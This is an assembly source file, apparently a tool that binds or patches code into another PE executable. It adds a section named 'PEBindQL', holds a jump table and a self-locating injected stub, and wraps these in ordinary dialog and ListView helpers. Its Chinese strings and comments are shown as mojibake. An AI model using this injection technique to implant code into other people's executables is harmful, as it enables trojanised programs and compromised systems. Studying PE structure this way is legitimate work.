    db 7Bh,0Ah,00h,00h,0E9h,76h,0Ah,00h,00h,0E9h,71h,0Ah,00h,00h,0E9h,6Ch
    db 0Ah,00h,00h,0E9h,67h,0Ah,00h,00h,0E9h,62h,0Ah,00h,00h,0E9h,5Dh,0Ah
    db 00h,00h,0E9h,58h,0Ah,00h,00h,0E9h,53h,0Ah,00h,00h,0E9h,4Eh,0Ah,00h
    db 00h,0E9h,49h,0Ah,00h,00h,0E9h,44h,0Ah,00h,00h,0E9h,3Fh,0Ah,00h,00h
    db 0E9h,3Ah,0Ah,00h,00h,0E9h,35h,0Ah,00h,00h,0E9h,30h,0Ah,00h,00h,0E9h
    db 2Bh,0Ah,00h,00h,0E9h,26h,0Ah,00h,00h,0E9h,21h,0Ah,00h,00h,0E9h,1Ch
    db 0Ah,00h,00h,0E9h,17h,0Ah,00h,00h,0E9h,12h,0Ah,00h,00h,0E9h,0Dh,0Ah
    db 00h,00h,0E9h,08h,0Ah,00h,00h,0E9h,03h,0Ah,00h,00h,0E9h,0FEh,09h,00h
    db 00h,0E9h,0F9h,09h,00h,00h,0E9h,0F4h,09h,00h,00h,0E9h,0EFh,09h,00h,00h
    db 0E9h,0EAh,09h,00h,00h,0E9h,0E5h,09h,00h,00h,0E9h,0E0h,09h,00h,00h,0E9h
    db 0DBh,09h,00h,00h,0E9h,0D6h,09h,00h,00h,0E9h,0D1h,09h,00h,00h,0E9h,0CCh
    db 09h,00h,00h,0E9h,0C7h,09h,00h,00h,0E9h,0C2h,09h,00h,00h,0E9h,0BDh,09h
    db 00h,00h,0E9h,0B8h,09h,00h,00h,0E9h,0B3h,09h,00h,00h,0E9h,0AEh,09h,00h
    db 00h,0E9h,0A9h,09h,00h,00h,0E9h,0A4h,09h,00h,00h,0E9h,9Fh,09h,00h,00h
    db 0E9h,9Ah,09h,00h,00h,0E9h,95h,09h,00h,00h,0E9h,90h,09h,00h,00h,0E9h
    db 8Bh,09h,00h,00h,0E9h,86h,09h,00h,00h,0E9h,81h,09h,00h,00h,0E9h,7Ch
    db 09h,00h,00h,0E9h,77h,09h,00h,00h,0E9h,72h,09h,00h,00h,0E9h,6Dh,09h
    db 00h,00h,0E9h,68h,09h,00h,00h,0E9h,63h,09h,00h,00h,0E9h,5Eh,09h,00h
    db 00h,0E9h,59h,09h,00h,00h,0E9h,54h,09h,00h,00h,0E9h,4Fh,09h,00h,00h
    db 0E9h,4Ah,09h,00h,00h,0E9h,45h,09h,00h,00h,0E9h,40h,09h,00h,00h,0E9h
    db 3Bh,09h,00h,00h,0E9h,36h,09h,00h,00h,0E9h,31h,09h,00h,00h,0E9h,2Ch
    db 09h,00h,00h,0E9h,27h,09h,00h,00h,0E9h,22h,09h,00h,00h,0E9h,1Dh,09h
    db 00h,00h,0E9h,18h,09h,00h,00h,0E9h,13h,09h,00h,00h,0E9h,0Eh,09h,00h
    db 00h,0E9h,09h,09h,00h,00h,0E9h,04h,09h,00h,00h,0E9h,0FFh,08h,00h,00h
    db 0E9h,0FAh,08h,00h,00h,0E9h,0F5h,08h,00h,00h,0E9h,0F0h,08h,00h,00h,0E9h
    db 0EBh,08h,00h,00h,0E9h,0E6h,08h,00h,00h,0E9h,0E1h,08h,00h,00h,0E9h,0DCh
    db 08h,00h,00h,0E9h,0D7h,08h,00h,00h,0E9h,0D2h,08h,00h,00h,0E9h,0CDh,08h
    db 00h,00h,0E9h,0C8h,08h,00h,00h,0E9h,0C3h,08h,00h,00h,0E9h,0BEh,08h,00h
    db 00h,0E9h,0B9h,08h,00h,00h,0E9h,0B4h,08h,00h,00h,0E9h,0AFh,08h,00h,00h
    db 0E9h,0AAh,08h,00h,00h,0E9h,0A5h,08h,00h,00h,0E9h,0A0h,08h,00h,00h,0E9h
    db 9Bh,08h,00h,00h,0E9h,96h,08h,00h,00h,0E9h,91h,08h,00h,00h,0E9h,8Ch
    db 08h,00h,00h,0E9h,87h,08h,00h,00h,0E9h,82h,08h,00h,00h,0E9h,7Dh,08h
    db 00h,00h,0E9h,78h,08h,00h,00h,0E9h,73h,08h,00h,00h,0E9h,6Eh,08h,00h
    db 00h,0E9h,69h,08h,00h,00h,0E9h,64h,08h,00h,00h,0E9h,5Fh,08h,00h,00h
    db 0E9h,5Ah,08h,00h,00h,0E9h,55h,08h,00h,00h,0E9h,50h,08h,00h,00h,0E9h
    db 4Bh,08h,00h,00h,0E9h,46h,08h,00h,00h,0E9h,41h,08h,00h,00h,0E9h,3Ch
    db 08h,00h,00h,0E9h,37h,08h,00h,00h,0E9h,32h,08h,00h,00h,0E9h,2Dh,08h
    db 00h,00h,0E9h,28h,08h,00h,00h,0E9h,23h,08h,00h,00h,0E9h,1Eh,08h,00h
    db 00h,0E9h,19h,08h,00h,00h,0E9h,14h,08h,00h,00h,0E9h,0Fh,08h,00h,00h
    db 0E9h,0Ah,08h,00h,00h,0E9h,05h,08h,00h,00h,0E9h,00h,08h,00h,00h,0E9h
    db 0FBh,07h,00h,00h,0E9h,0F6h,07h,00h,00h,0E9h,0F1h,07h,00h,00h,0E9h,0ECh
    db 07h,00h,00h,0E9h,0E7h,07h,00h,00h,0E9h,0E2h,07h,00h,00h,0E9h,0DDh,07h
    db 00h,00h,0E9h,0D8h,07h,00h,00h,0E9h,0D3h,07h,00h,00h,0E9h,0CEh,07h,00h
    db 00h,0E9h,0C9h,07h,00h,00h,0E9h,0C4h,07h,00h,00h,0E9h,0BFh,07h,00h,00h
    db 0E9h,0BAh,07h,00h,00h,0E9h,0B5h,07h,00h,00h,0E9h,0B0h,07h,00h,00h,0E9h
    db 0ABh,07h,00h,00h,0E9h,0A6h,07h,00h,00h,0E9h,0A1h,07h,00h,00h,0E9h,9Ch
    db 07h,00h,00h,0E9h,97h,07h,00h,00h,0E9h,92h,07h,00h,00h,0E9h,8Dh,07h
    db 00h,00h,0E9h,88h,07h,00h,00h,0E9h,83h,07h,00h,00h,0E9h,7Eh,07h,00h
    db 00h,0E9h,79h,07h,00h,00h,0E9h,74h,07h,00h,00h,0E9h,6Fh,07h,00h,00h
    db 0E9h,6Ah,07h,00h,00h,0E9h,65h,07h,00h,00h,0E9h,60h,07h,00h,00h,0E9h
    db 5Bh,07h,00h,00h,0E9h,56h,07h,00h,00h,0E9h,51h,07h,00h,00h,0E9h,4Ch
    db 07h,00h,00h,0E9h,47h,07h,00h,00h,0E9h,42h,07h,00h,00h,0E9h,3Dh,07h
    db 00h,00h,0E9h,38h,07h,00h,00h,0E9h,33h,07h,00h,00h,0E9h,2Eh,07h,00h
    db 00h,0E9h,29h,07h,00h,00h,0E9h,24h,07h,00h,00h,0E9h,1Fh,07h,00h,00h
    db 0E9h,1Ah,07h,00h,00h,0E9h,15h,07h,00h,00h,0E9h,10h,07h,00h,00h,0E9h
    db 0Bh,07h,00h,00h,0E9h,06h,07h,00h,00h,0E9h,01h,07h,00h,00h,0E9h,0FCh
    db 06h,00h,00h,0E9h,0F7h,06h,00h,00h,0E9h,0F2h,06h,00h,00h,0E9h,0EDh,06h
    db 00h,00h,0E9h,0E8h,06h,00h,00h,0E9h,0E3h,06h,00h,00h,0E9h,0DEh,06h,00h
    db 00h,0E9h,0D9h,06h,00h,00h,0E9h,0D4h,06h,00h,00h,0E9h,0CFh,06h,00h,00h
    db 0E9h,0CAh,06h,00h,00h,0E9h,0C5h,06h,00h,00h,0E9h,0C0h,06h,00h,00h,0E9h
    db 0BBh,06h,00h,00h,0E9h,0B6h,06h,00h,00h,0E9h,0B1h,06h,00h,00h,0E9h,0ACh
    db 06h,00h,00h,0E9h,0A7h,06h,00h,00h,0E9h,0A2h,06h,00h,00h,0E9h,9Dh,06h
    db 00h,00h,0E9h,98h,06h,00h,00h,0E9h,93h,06h,00h,00h,0E9h,8Eh,06h,00h
    db 00h,0E9h,89h,06h,00h,00h,0E9h,84h,06h,00h,00h,0E9h,7Fh,06h,00h,00h
    db 0E9h,7Ah,06h,00h,00h,0E9h,75h,06h,00h,00h,0E9h,70h,06h,00h,00h,0E9h
    db 6Bh,06h,00h,00h,0E9h,66h,06h,00h,00h,0E9h,61h,06h,00h,00h,0E9h,5Ch
    db 06h,00h,00h,0E9h,57h,06h,00h,00h,0E9h,52h,06h,00h,00h,0E9h,4Dh,06h
    db 00h,00h,0E9h,48h,06h,00h,00h,0E9h,43h,06h,00h,00h,0E9h,3Eh,06h,00h
    db 00h,0E9h,39h,06h,00h,00h,0E9h,34h,06h,00h,00h,0E9h,2Fh,06h,00h,00h
    db 0E9h,2Ah,06h,00h,00h,0E9h,25h,06h,00h,00h,0E9h,20h,06h,00h,00h,0E9h
    db 1Bh,06h,00h,00h,0E9h,16h,06h,00h,00h,0E9h,11h,06h,00h,00h,0E9h,0Ch
    db 06h,00h,00h,0E9h,07h,06h,00h,00h,0E9h,02h,06h,00h,00h,0E9h,0FDh,05h
    db 00h,00h,0E9h,0F8h,05h,00h,00h,0E9h,0F3h,05h,00h,00h,0E9h,0EEh,05h,00h
    db 00h,0E9h,0E9h,05h,00h,00h,0E9h,0E4h,05h,00h,00h,0E9h,0DFh,05h,00h,00h
    db 0E9h,0DAh,05h,00h,00h,0E9h,0D5h,05h,00h,00h,0E9h,0D0h,05h,00h,00h,0E9h
    db 0CBh,05h,00h,00h,0E9h,0C6h,05h,00h,00h,0E9h,0C1h,05h,00h,00h,0E9h,0BCh
    db 05h,00h,00h,0E9h,0B7h,05h,00h,00h,0E9h,0B2h,05h,00h,00h,0E9h,0ADh,05h
    db 00h,00h,0E9h,0A8h,05h,00h,00h,0E9h,0A3h,05h,00h,00h,0E9h,9Eh,05h,00h
    db 00h,0E9h,99h,05h,00h,00h,0E9h,94h,05h,00h,00h,0E9h,8Fh,05h,00h,00h
    db 0E9h,8Ah,05h,00h,00h,0E9h,85h,05h,00h,00h,0E9h,80h,05h,00h,00h,0E9h
    db 7Bh,05h,00h,00h,0E9h,76h,05h,00h,00h,0E9h,71h,05h,00h,00h,0E9h,6Ch
    db 05h,00h,00h,0E9h,67h,05h,00h,00h,0E9h,62h,05h,00h,00h,0E9h,5Dh,05h
    db 00h,00h,0E9h,58h,05h,00h,00h,0E9h,53h,05h,00h,00h,0E9h,4Eh,05h,00h
    db 00h,0E9h,49h,05h,00h,00h,0E9h,44h,05h,00h,00h,0E9h,3Fh,05h,00h,00h
    db 0E9h,3Ah,05h,00h,00h,0E9h,35h,05h,00h,00h,0E9h,30h,05h,00h,00h,0E9h
    db 2Bh,05h,00h,00h,0E9h,26h,05h,00h,00h,0E9h,21h,05h,00h,00h,0E9h,1Ch
    db 05h,00h,00h,0E9h,17h,05h,00h,00h,0E9h,12h,05h,00h,00h,0E9h,0Dh,05h
    db 00h,00h,0E9h,08h,05h,00h,00h,0E9h,03h,05h,00h,00h,0E9h,0FEh,04h,00h
    db 00h,0E9h,0F9h,04h,00h,00h,0E9h,0F4h,04h,00h,00h,0E9h,0EFh,04h,00h,00h
    db 0E9h,0EAh,04h,00h,00h,0E9h,0E5h,04h,00h,00h,0E9h,0E0h,04h,00h,00h,0E9h
    db 0DBh,04h,00h,00h,0E9h,0D6h,04h,00h,00h,0E9h,0D1h,04h,00h,00h,0E9h,0CCh
    db 04h,00h,00h,0E9h,0C7h,04h,00h,00h,0E9h,0C2h,04h,00h,00h,0E9h,0BDh,04h
    db 00h,00h,0E9h,0B8h,04h,00h,00h,0E9h,0B3h,04h,00h,00h,0E9h,0AEh,04h,00h
    db 00h,0E9h,0A9h,04h,00h,00h,0E9h,0A4h,04h,00h,00h,0E9h,9Fh,04h,00h,00h
    db 0E9h,9Ah,04h,00h,00h,0E9h,95h,04h,00h,00h,0E9h,90h,04h,00h,00h,0E9h
    db 8Bh,04h,00h,00h,0E9h,86h,04h,00h,00h,0E9h,81h,04h,00h,00h,0E9h,7Ch
    db 04h,00h,00h,0E9h,77h,04h,00h,00h,0E9h,72h,04h,00h,00h,0E9h,6Dh,04h
    db 00h,00h,0E9h,68h,04h,00h,00h,0E9h,63h,04h,00h,00h,0E9h,5Eh,04h,00h
    db 00h,0E9h,59h,04h,00h,00h,0E9h,54h,04h,00h,00h,0E9h,4Fh,04h,00h,00h
    db 0E9h,4Ah,04h,00h,00h,0E9h,45h,04h,00h,00h,0E9h,40h,04h,00h,00h,0E9h
    db 3Bh,04h,00h,00h,0E9h,36h,04h,00h,00h,0E9h,31h,04h,00h,00h,0E9h,2Ch
    db 04h,00h,00h,0E9h,27h,04h,00h,00h,0E9h,22h,04h,00h,00h,0E9h,1Dh,04h
    db 00h,00h,0E9h,18h,04h,00h,00h,0E9h,13h,04h,00h,00h,0E9h,0Eh,04h,00h
    db 00h,0E9h,09h,04h,00h,00h,0E9h,04h,04h,00h,00h,0E9h,0FFh,03h,00h,00h
    db 0E9h,0FAh,03h,00h,00h,0E9h,0F5h,03h,00h,00h,0E9h,0F0h,03h,00h,00h,0E9h
    db 0EBh,03h,00h,00h,0E9h,0E6h,03h,00h,00h,0E9h,0E1h,03h,00h,00h,0E9h,0DCh
    db 03h,00h,00h,0E9h,0D7h,03h,00h,00h,0E9h,0D2h,03h,00h,00h,0E9h,0CDh,03h
    db 00h,00h,0E9h,0C8h,03h,00h,00h,0E9h,0C3h,03h,00h,00h,0E9h,0BEh,03h,00h
    db 00h,0E9h,0B9h,03h,00h,00h,0E9h,0B4h,03h,00h,00h,0E9h,0AFh,03h,00h,00h
    db 0E9h,0AAh,03h,00h,00h,0E9h,0A5h,03h,00h,00h,0E9h,0A0h,03h,00h,00h,0E9h
    db 9Bh,03h,00h,00h,0E9h,96h,03h,00h,00h,0E9h,91h,03h,00h,00h,0E9h,8Ch
    db 03h,00h,00h,0E9h,87h,03h,00h,00h,0E9h,82h,03h,00h,00h,0E9h,7Dh,03h
    db 00h,00h,0E9h,78h,03h,00h,00h,0E9h,73h,03h,00h,00h,0E9h,6Eh,03h,00h
    db 00h,0E9h,69h,03h,00h,00h,0E9h,64h,03h,00h,00h,0E9h,5Fh,03h,00h,00h
    db 0E9h,5Ah,03h,00h,00h,0E9h,55h,03h,00h,00h,0E9h,50h,03h,00h,00h,0E9h
    db 4Bh,03h,00h,00h,0E9h,46h,03h,00h,00h,0E9h,41h,03h,00h,00h,0E9h,3Ch
    db 03h,00h,00h,0E9h,37h,03h,00h,00h,0E9h,32h,03h,00h,00h,0E9h,2Dh,03h
    db 00h,00h,0E9h,28h,03h,00h,00h,0E9h,23h,03h,00h,00h,0E9h,1Eh,03h,00h
    db 00h,0E9h,19h,03h,00h,00h,0E9h,14h,03h,00h,00h,0E9h,0Fh,03h,00h,00h
    db 0E9h,0Ah,03h,00h,00h,0E9h,05h,03h,00h,00h,0E9h,00h,03h,00h,00h,0E9h
    db 0FBh,02h,00h,00h,0E9h,0F6h,02h,00h,00h,0E9h,0F1h,02h,00h,00h,0E9h,0ECh
    db 02h,00h,00h,0E9h,0E7h,02h,00h,00h,0E9h,0E2h,02h,00h,00h,0E9h,0DDh,02h
    db 00h,00h,0E9h,0D8h,02h,00h,00h,0E9h,0D3h,02h,00h,00h,0E9h,0CEh,02h,00h
    db 00h,0E9h,0C9h,02h,00h,00h,0E9h,0C4h,02h,00h,00h,0E9h,0BFh,02h,00h,00h
    db 0E9h,0BAh,02h,00h,00h,0E9h,0B5h,02h,00h,00h,0E9h,0B0h,02h,00h,00h,0E9h
    db 0ABh,02h,00h,00h,0E9h,0A6h,02h,00h,00h,0E9h,0A1h,02h,00h,00h,0E9h,9Ch
    db 02h,00h,00h,0E9h,97h,02h,00h,00h,0E9h,92h,02h,00h,00h,0E9h,8Dh,02h
    db 00h,00h,0E9h,88h,02h,00h,00h,0E9h,83h,02h,00h,00h,0E9h,7Eh,02h,00h
    db 00h,0E9h,79h,02h,00h,00h,0E9h,74h,02h,00h,00h,0E9h,6Fh,02h,00h,00h
    db 0E9h,6Ah,02h,00h,00h,0E9h,65h,02h,00h,00h,0E9h,60h,02h,00h,00h,0E9h
    db 5Bh,02h,00h,00h,0E9h,56h,02h,00h,00h,0E9h,51h,02h,00h,00h,0E9h,4Ch
    db 02h,00h,00h,0E9h,47h,02h,00h,00h,0E9h,42h,02h,00h,00h,0E9h,3Dh,02h
    db 00h,00h,0E9h,38h,02h,00h,00h,0E9h,33h,02h,00h,00h,0E9h,2Eh,02h,00h
    db 00h,0E9h,29h,02h,00h,00h,0E9h,24h,02h,00h,00h,0E9h,1Fh,02h,00h,00h
    db 0E9h,1Ah,02h,00h,00h,0E9h,15h,02h,00h,00h,0E9h,10h,02h,00h,00h,0E9h
    db 0Bh,02h,00h,00h,0E9h,06h,02h,00h,00h,0E9h,01h,02h,00h,00h,0E9h,0FCh
    db 01h,00h,00h,0E9h,0F7h,01h,00h,00h,0E9h,0F2h,01h,00h,00h,0E9h,0EDh,01h
    db 00h,00h,0E9h,0E8h,01h,00h,00h,0E9h,0E3h,01h,00h,00h,0E9h,0DEh,01h,00h
    db 00h,0E9h,0D9h,01h,00h,00h,0E9h,0D4h,01h,00h,00h,0E9h,0CFh,01h,00h,00h
    db 0E9h,0CAh,01h,00h,00h,0E9h,0C5h,01h,00h,00h,0E9h,0C0h,01h,00h,00h,0E9h
    db 0BBh,01h,00h,00h,0E9h,0B6h,01h,00h,00h,0E9h,0B1h,01h,00h,00h,0E9h,0ACh
    db 01h,00h,00h,0E9h,0A7h,01h,00h,00h,0E9h,0A2h,01h,00h,00h,0E9h,9Dh,01h
    db 00h,00h,0E9h,98h,01h,00h,00h,0E9h,93h,01h,00h,00h,0E9h,8Eh,01h,00h
    db 00h,0E9h,89h,01h,00h,00h,0E9h,84h,01h,00h,00h,0E9h,7Fh,01h,00h,00h
    db 0E9h,7Ah,01h,00h,00h,0E9h,75h,01h,00h,00h,0E9h,70h,01h,00h,00h,0E9h
    db 6Bh,01h,00h,00h,0E9h,66h,01h,00h,00h,0E9h,61h,01h,00h,00h,0E9h,5Ch
    db 01h,00h,00h,0E9h,57h,01h,00h,00h,0E9h,52h,01h,00h,00h,0E9h,4Dh,01h
    db 00h,00h,0E9h,48h,01h,00h,00h,0E9h,43h,01h,00h,00h,0E9h,3Eh,01h,00h
    db 00h,0E9h,39h,01h,00h,00h,0E9h,34h,01h,00h,00h,0E9h,2Fh,01h,00h,00h
    db 0E9h,2Ah,01h,00h,00h,0E9h,25h,01h,00h,00h,0E9h,20h,01h,00h,00h,0E9h
    db 1Bh,01h,00h,00h,0E9h,16h,01h,00h,00h,0E9h,11h,01h,00h,00h,0E9h,0Ch
    db 01h,00h,00h,0E9h,07h,01h,00h,00h,0E9h,02h,01h,00h,00h,0E9h,0FDh,00h
    db 00h,00h,0E9h,0F8h,00h,00h,00h,0E9h,0F3h,00h,00h,00h,0E9h,0EEh,00h,00h
    db 00h,0E9h,0E9h,00h,00h,00h,0E9h,0E4h,00h,00h,00h,0E9h,0DFh,00h,00h,00h
    db 0E9h,0DAh,00h,00h,00h,0E9h,0D5h,00h,00h,00h,0E9h,0D0h,00h,00h,00h,0E9h
    db 0CBh,00h,00h,00h,0E9h,0C6h,00h,00h,00h,0E9h,0C1h,00h,00h,00h,0E9h,0BCh
    db 00h,00h,00h,0E9h,0B7h,00h,00h,00h,0E9h,0B2h,00h,00h,00h,0E9h,0ADh,00h
    db 00h,00h,0E9h,0A8h,00h,00h,00h,0E9h,0A3h,00h,00h,00h,0E9h,9Eh,00h,00h
    db 00h,0E9h,99h,00h,00h,00h,0E9h,94h,00h,00h,00h,0E9h,8Fh,00h,00h,00h
    db 0E9h,8Ah,00h,00h,00h,0E9h,85h,00h,00h,00h,0E9h,80h,00h,00h,00h,0EBh
    db 7Eh,0EBh,7Ch,0EBh,7Ah,0EBh,78h,0EBh,76h,0EBh,74h,0EBh,72h,0EBh,70h,0EBh
    db 6Eh,0EBh,6Ch,0EBh,6Ah,0EBh,68h,0EBh,66h,0EBh,64h,0EBh,62h,0EBh,60h,0EBh
    db 5Eh,0EBh,5Ch,0EBh,5Ah,0EBh,58h,0EBh,56h,0EBh,54h,0EBh,52h,0EBh,50h,0EBh
    db 4Eh,0EBh,4Ch,0EBh,4Ah,0EBh,48h,0EBh,46h,0EBh,44h,0EBh,42h,0EBh,40h,0EBh
    db 3Eh,0EBh,3Ch,0EBh,3Ah,0EBh,38h,0EBh,36h,0EBh,34h,0EBh,32h,0EBh,30h,0EBh
    db 2Eh,0EBh,2Ch,0EBh,2Ah,0EBh,28h,0EBh,26h,0EBh,24h,0EBh,22h,0EBh,20h,0EBh
    db 1Eh,0EBh,1Ch,0EBh,1Ah,0EBh,18h,0EBh,16h,0EBh,14h,0EBh,12h,0EBh,10h,0EBh
    db 0Eh,0EBh,0Ch,0EBh,0Ah,0EBh,08h,0EBh,06h,0EBh,04h,0EBh,02h,0EBh,00h,0FFh
    db 75h,0FCh,0FFh,75h,0F8h,0FFh,93h,00h,26h,40h,00h,6Ah,00h,6Ah,00h,6Ah
    db 10h,0FFh,75h,0ECh,0FFh,93h,10h,26h,40h,00h,0C9h,0C3h,60h,50h,0E8h,75h
    db 32h,0FFh,0FFh,89h,83h,0F0h,25h,40h,00h,0B8h,05h,10h,40h,00h,03h,0C3h
    db 8Bh,8Bh,0F0h,25h,40h,00h,50h,51h,0E8h,0D5h,32h,0FFh,0FFh,89h,83h,0F8h
    db 25h,40h,00h,0B8h,14h,10h,40h,00h,03h,0C3h,0BFh,0F0h,25h,40h,00h,8Bh
    db 0Ch,1Fh,0BAh,0F8h,25h,40h,00h,03h,0D3h,50h,51h,0FFh,12h,89h,83h,0FCh
    db 25h,40h,00h,0B8h,9Ah,10h,40h,00h,03h,0C3h,0BFh,0FCh,25h,40h,00h,8Bh
    db 14h,1Fh,50h,0FFh,0D2h,89h,83h,0F4h,25h,40h,00h,0E8h,45h,33h,0FFh,0FFh
    db 0E8h,0ABh,34h,0FFh,0FFh,61h,0C3h,8Bh,04h,24h,50h,0E8h,00h,00h,00h,00h
    db 5Bh,81h,0EBh,50h,0F4h,40h,00h,58h,0E8h,7Fh,0FFh,0FFh,0FFh,0C3h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h

.const
sz1         db '%d',0
szDllEdit   db 'RichEd20.dll',0
szClassEdit db 'RichEdit20A',0
szFont      db '����',0
szExtPe     db 'PE File',0,'*.exe;*.dll;*.scr;*.fon;*.drv',0
            db 'All Files(*.*)',0,'*.*',0,0
szErr       db '�ļ���ʽ����!',0
szErrFormat db '����ļ�����PE��ʽ���ļ�!',0
szSuccess   db '��ϲ�㣬����ִ�е������ǳɹ��ġ�',0
szNotFound  db '�޷�����',0
szNewSection db 'PEBindQL',0

szCrLf      db 0dh,0ah,0

szOut100       db '��������δ�С��%08x',0dh,0ah,0
szOut104       db '��϶һ�Ĵ�СΪ��%08x',0dh,0ah,0
szOut101       db 'Ŀ��PE�ļ�ͷ����Ч���ݳ���Ϊ��%08x ',0dh,0ah,0
szOut102       db 'Ŀ��PE�ļ�ͷ��Ч���ݳ��ȶ�����ֵΪ��%08x',0dh,0ah,0
szOut103       db '���ļ���PEͷ������λ�������ļ�ƫ�ƣ�%08x��',0dh,0ah,0
szOut105       db 'ԭ�ļ���СΪ��%08x   �Ӳ���������ļ��Ĵ�СΪ��%08x',0dh,0ah,0
szOut106       db 'Ŀ��PE����ڵ�ַΪ��%08x',0dh,0ah,0
szOut107       db '������Ҫ�������ļ�ƫ�Ƶ�ַ���£�',0dh,0ah,0
szOut108       db '   ������%s     ԭʼƫ�ƣ�%08x     �������ƫ�ƣ�%08x',0dh,0ah,0
szOut109       db '���ļ���PEͷʵ�ʴ�СΪ��%08x',0dh,0ah,0
szOut110       db '�ڱ�������λ���ļ���ƫ�ƣ�%08x',0dh,0ah,0
szOut111       db 'Ŀ��������нڱ�ռ�õ��ֽ�����%08x',0dh,0ah,0
szOut112       db '���������е�E9ָ���Ĳ���������Ϊ��%08x',0dh,0ah,0
szOut113       db 'Ŀ��PEͷ�����ݵ���Ч����Ϊ:%08x',0dh,0ah,0
szOut114       db '�����ڰ����ļ��������ȶ����Ժ�Ĵ�СΪ:%08x',0dh,0ah,0
szOut115       db '��PE�ļ�����ڵ�ַΪ��%08x',0dh,0ah,0

szOut121       db 'PE�ļ���С��%08x   �����Ժ�Ĵ�С��%08x',0dh,0ah,0
szOut122       db 'Ŀ���ļ����һ�����ļ��е���ʼƫ�ƣ�%08x',0dh,0ah,0
szOut123       db 'Ŀ���ļ����һ�ڶ����Ĵ�С��%08x',0dh,0ah,0
szOut124       db '���ļ���С��%08x',0dh,0ah,0

szOut1      db '��������%s',0dh,0ah,0
szOut2      db 'Ŀ��PE����%s',0dh,0ah,0
szOutErr    db '����γ��ȴ���0DA8h����϶һ�Ŀռ䲻�㣡',0dh,0ah,0
lpszHexArr  db  '0123456789ABCDEF',0

.data?
stLVC         LV_COLUMN <?>
stLVI         LV_ITEM   <?>

.code

;----------------
;��ʼ�����ڳ���
;----------------
_init proc
  local @stCf:CHARFORMAT
  
  invoke GetDlgItem,hWinMain,IDC_INFO
  mov hWinEdit,eax
  invoke LoadIcon,hInstance,ICO_MAIN
  invoke SendMessage,hWinMain,WM_SETICON,ICON_BIG,eax       ;Ϊ��������ͼ��
  invoke SendMessage,hWinEdit,EM_SETTEXTMODE,TM_PLAINTEXT,0 ;���ñ༭�ؼ�
  invoke RtlZeroMemory,addr @stCf,sizeof @stCf
  mov @stCf.cbSize,sizeof @stCf
  mov @stCf.yHeight,9*20
  mov @stCf.dwMask,CFM_FACE or CFM_SIZE or CFM_BOLD
  invoke lstrcpy,addr @stCf.szFaceName,addr szFont
  invoke SendMessage,hWinEdit,EM_SETCHARFORMAT,0,addr @stCf
  invoke SendMessage,hWinEdit,EM_EXLIMITTEXT,0,-1
  ret
_init endp

;------------------
; ����Handler
;------------------
_Handler proc _lpExceptionRecord,_lpSEH,\
              _lpContext,_lpDispathcerContext

  pushad
  mov esi,_lpExceptionRecord
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_Handler endp



;-------------------------
; ��ListView������һ����
; ���룺_dwColumn = ���ӵ��б��
;	_dwWidth = �еĿ��
;	_lpszHead = �еı����ַ��� 
;-------------------------
_ListViewAddColumn	proc  uses ebx ecx _hWinView,_dwColumn,_dwWidth,_lpszHead
		local	@stLVC:LV_COLUMN

		invoke	RtlZeroMemory,addr @stLVC,sizeof LV_COLUMN
		mov	@stLVC.imask,LVCF_TEXT or LVCF_WIDTH or LVCF_FMT
		mov	@stLVC.fmt,LVCFMT_LEFT
		push	_lpszHead
		pop	@stLVC.pszText
		push	_dwWidth
		pop	@stLVC.lx
              push  _dwColumn
              pop   @stLVC.iSubItem
		invoke	SendMessage,_hWinView,LVM_INSERTCOLUMN,_dwColumn,addr @stLVC
		ret
_ListViewAddColumn	endp
;----------------------------------------------------------------------
; ��ListView������һ�У����޸�һ����ĳ���ֶε�����
; ���룺_dwItem = Ҫ�޸ĵ��еı��
